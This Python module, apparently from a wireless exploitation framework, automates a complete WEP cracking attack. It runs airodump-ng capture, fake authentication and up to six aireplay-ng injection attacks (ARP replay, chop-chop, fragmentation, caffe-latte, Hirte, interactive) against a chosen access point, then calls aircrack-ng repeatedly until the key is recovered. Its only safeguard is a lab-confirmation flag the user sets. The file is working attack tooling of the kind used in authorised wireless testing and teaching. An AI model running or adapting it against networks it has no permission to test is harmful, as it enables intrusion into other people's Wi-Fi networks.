#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""WEP Complete Attack Suite - orchestrates all 6 aireplay-ng WEP attacks with auto-crack.

Cycles through WEP attack vectors (ARP replay, chop-chop, fragmentation,
caffe-latte, Hirte, P0841/interactive) while airodump-ng captures IVs.
Automatically triggers aircrack-ng once sufficient IVs are collected.

Requires: aircrack-ng suite, monitor-mode interface with injection support.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import threading
import time
from typing import List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


def _which(binary: str) -> Optional[str]:
    return shutil.which(binary)


class Exploit(Exploit):
    """Orchestrate all WEP attack vectors with automatic IV capture and cracking."""

    __info__ = {
        "name": "WEP Complete Attack Suite",
        "description": (
            "Orchestrates all aireplay-ng WEP attack modes (ARP replay, chop-chop, "
            "fragmentation, caffe-latte, Hirte, interactive/P0841) while running "
            "airodump-ng for IV collection. Auto-triggers aircrack-ng when the IV "
            "threshold is reached. Supports PTW (fast, 60k IVs) and FMS/KoreK "
            "(classic, 250k+ IVs) crack strategies."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            "aircrack-ng team (GPL-2.0, invoked as subprocess)",
        ),
        "references": (
            "https://www.aircrack-ng.org/doku.php?id=simple_wep_crack",
            "https://www.aircrack-ng.org/doku.php?id=aireplay-ng",
        ),
        "devices": ("wifi", "802.11 WEP"),
    }

    interface = OptString("", "Monitor-mode interface (e.g., wlan0mon)")
    bssid = OptString("", "Target AP BSSID")
    essid = OptString("", "Target AP ESSID (optional but recommended)")
    channel = OptInteger(0, "AP channel (required)")
    output_prefix = OptString("wep_capture", "File prefix for airodump output")

    attack_arp_replay = OptBool(True, "Enable ARP replay attack (-3)")
    attack_chopchop = OptBool(True, "Enable chop-chop attack (-4)")
    attack_fragment = OptBool(True, "Enable fragmentation attack (-5)")
    attack_caffe_latte = OptBool(False, "Enable caffe-latte attack (-6, client-side)")
    attack_hirte = OptBool(False, "Enable Hirte CFrag attack (-7, client-side)")
    attack_interactive = OptBool(False, "Enable interactive/P0841 attack (-2)")

    inject_source_mac = OptString("", "Source MAC for injection (-h); empty = auto")
    fakeauth_keepalive = OptBool(True, "Maintain fake-auth association (-1)")
    crack_at_ivs = OptInteger(15000, "Start cracking when IVs reach this count")
    crack_interval_s = OptInteger(60, "Seconds between crack attempts")
    wep_keylen = OptInteger(0, "Expected WEP key bits (64/128/256); 0 = auto")
    max_time_s = OptInteger(1800, "Maximum total attack time in seconds (0 = unlimited)")

    dry_run = OptBool(False, "Print commands without executing")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    def _require(self, name: str) -> Optional[str]:
        path = _which(name)
        if not path:
            print_error(f"{name} not found. Install: apt install aircrack-ng")
        return path

    def _start_bg(self, cmd: List[str], label: str) -> Optional[subprocess.Popen]:
        cmd_str = " ".join(cmd)
        if bool(self.dry_run):
            print_info(f"[dry-run bg] {label}: {cmd_str}")
            return None
        print_status(f"Starting {label}: {cmd_str}")
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid if os.name != "nt" else None,
            )
            print_success(f"{label} PID {proc.pid}")
            return proc
        except FileNotFoundError:
            print_error(f"Binary not found: {cmd[0]}")
            return None

    def _kill(self, proc: Optional[subprocess.Popen], label: str) -> None:
        if proc and proc.poll() is None:
            try:
                if os.name != "nt":
                    os.killpg(os.getpgid(proc.pid), 9)
                else:
                    proc.kill()
                print_status(f"Stopped {label} (PID {proc.pid})")
            except (ProcessLookupError, OSError):
                pass

    def _count_ivs(self) -> int:
        """Parse airodump CSV to estimate IV count for target BSSID."""
        csv_path = f"{str(self.output_prefix).strip()}-01.csv"
        if not os.path.isfile(csv_path):
            return 0
        try:
            bssid_target = str(self.bssid).strip().upper()
            with open(csv_path, "r", errors="replace") as f:
                for line in f:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 11 and parts[0].upper() == bssid_target:
                        try:
                            return int(parts[10])
                        except (ValueError, IndexError):
                            pass
        except OSError:
            pass
        return 0

    def _try_crack(self, aircrack_bin: str) -> bool:
        """Attempt aircrack-ng WEP crack on current capture."""
        cap = f"{str(self.output_prefix).strip()}-01.cap"
        if not os.path.isfile(cap):
            return False

        cmd = [aircrack_bin]
        bssid = str(self.bssid).strip()
        if bssid:
            cmd.extend(["-b", bssid])
        keylen = int(self.wep_keylen)
        if keylen > 0:
            cmd.extend(["-n", str(keylen)])
        cmd.append(cap)

        print_status("Attempting WEP crack...")
        try:
            result = subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                timeout=120,
            )
            output = result.stdout.decode("utf-8", errors="replace")
            if "KEY FOUND!" in output:
                for line in output.splitlines():
                    if "KEY FOUND!" in line:
                        print_success(line.strip())
                return True
            print_info("Key not found yet - continuing IV collection...")
        except subprocess.TimeoutExpired:
            print_status("Crack attempt timed out - continuing...")
        except FileNotFoundError:
            print_error("aircrack-ng disappeared from PATH.")
        return False

    def run(self) -> None:
        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return
        require_authorised_lab()

        airodump = self._require("airodump-ng")
        aireplay = self._require("aireplay-ng")
        aircrack = self._require("aircrack-ng")
        if not all([airodump, aireplay, aircrack]):
            return

        iface = str(self.interface).strip()
        bssid = str(self.bssid).strip()
        ch = int(self.channel)
        prefix = str(self.output_prefix).strip()
        src_mac = str(self.inject_source_mac).strip()

        if not iface or not bssid or ch <= 0:
            print_error("Set interface, bssid, and channel.")
            return

        if bool(self.dry_run):
            print_info("[dry-run] Would start: airodump + fakeauth + WEP attacks + auto-crack")
            return

        procs = []

        # 1) Start airodump-ng for IV capture
        dump_cmd = [
            airodump, "--bssid", bssid, "--channel", str(ch),
            "-w", prefix, "--output-format", "pcap,csv", iface,
        ]
        dump_proc = self._start_bg(dump_cmd, "airodump-ng")
        if dump_proc:
            procs.append(("airodump-ng", dump_proc))
        time.sleep(3)

        # 2) Fake-auth keepalive
        if bool(self.fakeauth_keepalive):
            fa_cmd = [aireplay, "-1", "30", "-a", bssid]
            if src_mac:
                fa_cmd.extend(["-h", src_mac])
            fa_cmd.append(iface)
            fa_proc = self._start_bg(fa_cmd, "fakeauth")
            if fa_proc:
                procs.append(("fakeauth", fa_proc))
            time.sleep(2)

        # 3) Launch enabled attacks
        attacks = []
        if bool(self.attack_arp_replay):
            attacks.append(("ARP-replay", ["-3"]))
        if bool(self.attack_chopchop):
            attacks.append(("chop-chop", ["-4"]))
        if bool(self.attack_fragment):
            attacks.append(("fragmentation", ["-5"]))
        if bool(self.attack_caffe_latte):
            attacks.append(("caffe-latte", ["-6"]))
        if bool(self.attack_hirte):
            attacks.append(("Hirte", ["-7"]))
        if bool(self.attack_interactive):
            attacks.append(("interactive", ["-2"]))

        for name, flags in attacks:
            cmd = [aireplay] + flags + ["-a", bssid]
            if src_mac:
                cmd.extend(["-h", src_mac])
            cmd.append(iface)
            p = self._start_bg(cmd, f"aireplay {name}")
            if p:
                procs.append((f"aireplay-{name}", p))
            time.sleep(1)

        # 4) Monitor IVs and auto-crack
        start_time = time.time()
        max_t = int(self.max_time_s)
        threshold = int(self.crack_at_ivs)
        interval = int(self.crack_interval_s)
        cracked = False

        print_status(
            f"WEP attack running. Crack threshold: {threshold} IVs. "
            f"Check every {interval}s. Max time: {max_t}s."
        )

        try:
            while True:
                elapsed = time.time() - start_time
                if max_t > 0 and elapsed >= max_t:
                    print_status(f"Max time ({max_t}s) reached.")
                    break

                ivs = self._count_ivs()
                print_info(f"[{int(elapsed)}s] IVs collected: ~{ivs}")

                if ivs >= threshold:
                    if self._try_crack(aircrack):
                        cracked = True
                        break

                time.sleep(min(interval, 15))

        except KeyboardInterrupt:
            print_status("Interrupted by user.")

        # 5) Cleanup
        for label, proc in procs:
            self._kill(proc, label)

        if cracked:
            print_success("WEP key recovered successfully!")
        else:
            cap = f"{prefix}-01.cap"
            print_info(
                f"Attack stopped. Captured IVs in {cap}. "
                f"Manual crack: aircrack-ng -b {bssid} {cap}"
            )
